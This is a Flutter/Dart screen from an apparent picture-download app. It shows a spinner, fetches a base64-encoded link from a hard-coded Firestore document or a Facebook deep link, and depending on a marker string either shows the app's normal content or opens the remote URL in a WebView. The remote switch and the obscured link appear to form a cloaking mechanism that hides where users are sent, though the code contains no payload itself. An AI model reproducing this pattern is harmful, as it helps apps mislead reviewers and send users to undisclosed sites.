import 'dart:convert';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:facebook_deeplinks/facebook_deeplinks.dart';
import 'package:flutter/material.dart';
import 'package:pic_load/screens/content/content_screen.dart';
import 'package:pic_load/screens/webView/webView_screen.dart';
import 'package:shared_preferences/shared_preferences.dart';

class DownloadScreen extends StatefulWidget {
  const DownloadScreen({Key key}) : super(key: key);

  @override
  _DownloadScreenState createState() => _DownloadScreenState();
}

class _DownloadScreenState extends State<DownloadScreen> {
  bool checkValue = false;
  var facebookDeepLinks = FacebookDeeplinks();
  String deepLinkUrl;
  Future<SharedPreferences> prefs = SharedPreferences.getInstance();

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        body: Center(
      child: CircularProgressIndicator(),
    ));
  }

  @override
  void initState() {
    _storeDeepLink();
    super.initState();
    getLink();
  }

  void getLink() async {
    Map event;
    String link = '';
    String isLink = await getDeepLink();
    print('DeepLink: $isLink');
    if (isLink.isEmpty || isLink == null) {
      try {
        DocumentSnapshot ds = await FirebaseFirestore.instance
            .collection("user")
            .doc("R0PYJ0EypHWtlzmJ24ab")
            .get();
        event = ds.data();
        print("Link: ${event['link']}");
        link = event['link'];
        if (link.isEmpty || link == null) {
          Navigator.push(context,
              MaterialPageRoute(builder: (context) => ContentScreen()));
        } else {
          String decodeLink = utf8.decode(base64.decode(event['link']));
          if (decodeLink.contains("aod7dzh1gvp16g85bxet")) {
            Navigator.push(context,
                MaterialPageRoute(builder: (context) => ContentScreen()));
          } else {
            Navigator.push(
                context,
                MaterialPageRoute(
                    //'https://google.ru'
                    builder: (context) => WebViewScreen(link: decodeLink)));
          }
        }
      } catch (error) {
        print('Error: $error');
        Navigator.push(
            context, MaterialPageRoute(builder: (context) => ContentScreen()));
      }
    } else {
      Navigator.push(context, MaterialPageRoute(builder: (context) {
        return WebViewScreen(link: utf8.decode(base64.decode(deepLinkUrl)));
      }));
    }
  }

  // void asyncInitState() async {
  //   String isLink = await getDeepLink();
  //   print('Link from INIT: $isLink');
  //   if (isLink.isEmpty) {
  //     linkFireStore();
  //   } else {
  //     Navigator.push(context, MaterialPageRoute(builder: (context) {
  //       return WebViewScreen(link: "https://yandex.ru");
  //     }));
  //   }
  // }

  // void linkFireStore() async {
  //   Map event;
  //   String link;
  //   try {
  //     DocumentSnapshot ds = await FirebaseFirestore.instance
  //         .collection("user")
  //         .doc("R0PYJ0EypHWtlzmJ24ab")
  //         .get();
  //     event = ds.data();
  //     print("Link: ${event['link']}");
  //     link = event['link'];
  //     if (link.isEmpty || link == null) {
  //       Navigator.push(
  //           context, MaterialPageRoute(builder: (context) => ContentScreen()));
  //     } else {
  //       String decodeLink = utf8.decode(base64.decode(event['link']));
  //       if (decodeLink.contains("aod7dzh1gvp16g85bxet")) {
  //         Navigator.push(
  //             context, MaterialPageRoute(builder: (context) => ContentScreen()));
  //       } else {
  //         Navigator.push(
  //             context,
  //             MaterialPageRoute(  //'https://google.ru'
  //                 builder: (context) => WebViewScreen(link: decodeLink)));
  //       }
  //     }
  //   } catch (error) {
  //     print('Error: $error');
  //     Navigator.push(
  //         context, MaterialPageRoute(builder: (context) => ContentScreen()));
  //   }
  // }

  void _storeDeepLink() async {
    SharedPreferences pref = await SharedPreferences.getInstance();
    deepLinkUrl = await facebookDeepLinks.getInitialUrl();
    if (deepLinkUrl != null) {
      pref.setString("deepLink", deepLinkUrl);
      print("Link: $deepLinkUrl");
    }
    print('DeepLink: $deepLinkUrl');
  }

  Future<String> getDeepLink() async {
    SharedPreferences sharedPreferences = await prefs;
    print("Get in Store: ${sharedPreferences.getString("deepLink")}");
    return sharedPreferences.getString("deepLink") ?? '';
  }
}
